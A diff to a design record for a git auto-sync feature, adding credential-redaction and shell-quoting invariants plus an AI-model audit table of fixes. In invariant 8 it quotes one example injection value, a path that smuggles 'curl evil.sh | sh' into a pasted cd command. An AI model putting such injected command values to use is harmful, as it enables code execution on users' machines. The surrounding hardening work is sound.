@@ -118,9 +118,13 @@ There is no settings.json equivalent yet — env var is sufficient for the failu
 
 4. **No secrets in argv.** Only branch names and standard git verbs. Credentials come from git credential helper / SSH agent, never from us.
 
-5. **In-process serialization.** Concurrent `pushAsync` calls in the same pi process are serialized via `singleFlight`. Smoke verifies two parallel pushes return `[ok, noop]` (not two `failed` from index.lock contention).
+5. **In-process serialization.** Concurrent calls in the same pi process are serialized via a `tail`-chained promise queue (`singleFlight`). Smoke verifies both 2-way and 3-way concurrent pushes produce no `index.lock` contention. A previous (1.0) implementation used a single `inflightOp` slot; that worked for 2 callers but had a TOCTOU race with 3+, fixed in the Round 2 audit follow-up (see §Round 2).
 
 6. **Skipped is silent.** When `hasGitRemote` is false (no git repo or no origin), every op returns `result=skipped` and writes the audit row, but emits no console output. Users without a configured remote see zero noise.
+
+7. **Output-side credential redaction.** Symmetric to invariant 4 (argv-in). Anything captured from git — `git remote get-url origin` stdout, push/fetch stderr embedded in error messages — passes through `redactCredentials()` before storage in `~/.abrain/.state/git-sync.jsonl` or display in `/abrain status`. Closes the asymmetry that argv-in was protected but stderr/stdout-out were not (Round 2 audit finding M1).
+
+8. **Runbook shell-quoting.** The `/abrain sync` divergence runbook contains `cd <abrainHome>` for the user to copy/paste. `abrainHome` is shell-quoted via `shellQuotePath()` so a maliciously-crafted `ABRAIN_ROOT` env (e.g. `/tmp/evil"; curl evil.sh | sh; #`) cannot become a paste-time code-execution gadget (Round 2 audit finding M2).
 
 ## Alternatives considered
 
@@ -176,6 +180,31 @@ B runs `/abrain sync` → gets the runbook (cd + git merge/rebase choice). B pic
 - **ADR 0014 (abrain as cross-project substrate)**: this ADR is the missing transport layer between devices.
 - **ADR 0017 (strict project binding)**: now works cross-device — binding info is part of what auto-sync ships.
 - **ADR 0019 (abrain-managed vault identity)**: identity moved to abrain repo, so identity sync is part of abrain sync. `.vault-identity/master.age.pub` enters git and rides this transport; `.vault-identity/master.age` stays gitignored (still must be transported manually per ADR 0019).
+
+## Round 2 audit (2026-05-15, post-6cbc60a)
+
+Three models (opus-4-7 + gpt-5.5 + deepseek-v4-pro) audited the change in parallel. Consensus: ship-quality core (7-7.5/10), no CRITICAL, but five MAJORs and a handful of MINORs needed addressing before relying on this in production.
+
+| Finding | Where | Fix |
+|---|---|---|
+| **MAJOR-A** `classifyError` regex (English-only) silently mislabels real push rejections as `failed` under non-English `LANG` | git-sync.ts | Added module-level `GIT_ENV` (`LANG=C LC_ALL=C GIT_TERMINAL_PROMPT=0`); threaded into every `execFileAsync` site (7 sites). Dropped bare `/behind/i` from regex. |
+| **MAJOR-B** Credential URLs (`https://user:token@host/repo`) leak into `getStatus().remote` UI display + audit `error` field via push stderr | git-sync.ts | Added `redactCredentials()` export, called at both leak sites. Codified as invariant 7. |
+| **MAJOR-C** `PI_ABRAIN_DISABLED=1` does not gate `writer.ts:pushAsync` invocation — single-layer enforcement | sediment/writer.ts | Added inline `process.env.PI_ABRAIN_DISABLED !== "1"` to the push gate. ADR 0014 invariant #6 now belt + suspenders. |
+| **MAJOR-D** `singleFlight` TOCTOU: with 3+ concurrent callers, multiple microtasks resumed simultaneously after prior inflight resolved and all ran `fn()` in parallel | git-sync.ts | Rewrote as `tail`-chained promise queue. `tail.then(fn, fn)` runs each `fn` strictly after every prior settles (rejected slot prevents poison propagation). New smoke section pins the 3-way regression. |
+| **MAJOR-E** `/abrain sync` divergence runbook injects `abrainHome` unquoted into `cd` for user to paste; ABRAIN_ROOT with shell metachars → paste-time RCE | git-sync.ts | Added `shellQuotePath()`; runbook now uses `cd '<quoted>'`. Control-char paths return refusal placeholder. Codified as invariant 8. |
+| **MINOR** `git add ${rel}` lacks `--` option-parsing terminator | sediment/writer.ts | Added `"--"` to both gitCommit and gitCommitAbrain. |
+| **MINOR** SIGINT (Ctrl-C) was classified as `timeout` | git-sync.ts | `classifyError` now requires `signal === 'SIGTERM'` for `timeout`; SIGINT → `failed`. |
+| **MINOR** `classifyError` could label fetch errors as `push_rejected` if stderr matched regex | git-sync.ts | Added `allowPushRejected` parameter; fetch callers pass `false`. |
+| **MINOR** Smoke `rmSync` cleanup outside try/finally | smoke-abrain-git-sync.mjs | Wrapped in try/catch. |
+
+Smoke went from 20 to 27 assertions: new sections 13.2 (3-way queue regression), 14 (PI_ABRAIN_NO_AUTOSYNC contract), 15 (redaction + quoting truth tables), 16 (_queueDepth introspection).
+
+Deferred to follow-up (tracked under P0e candidates below, NOT in Round 2 commit):
+
+- Branch/remote detection (currently hardcoded `origin/main`; users on `master` branch silently no-op — gpt #4).
+- Smoke for sediment writer's dynamic-require integration (the primary auto-push wiring is currently smoke-bypassed since the smoke direct-requires git-sync — deepseek M1).
+- Audit log rotation (append-only; bounded read at 200KB — gpt minor 3).
+- Workflow/bind paths don't trigger auto-push (out of ADR 0020 scope but inconsistent — gpt minor 4/5).
 
 ## P0e candidates (deferred, recorded for traceability)
 
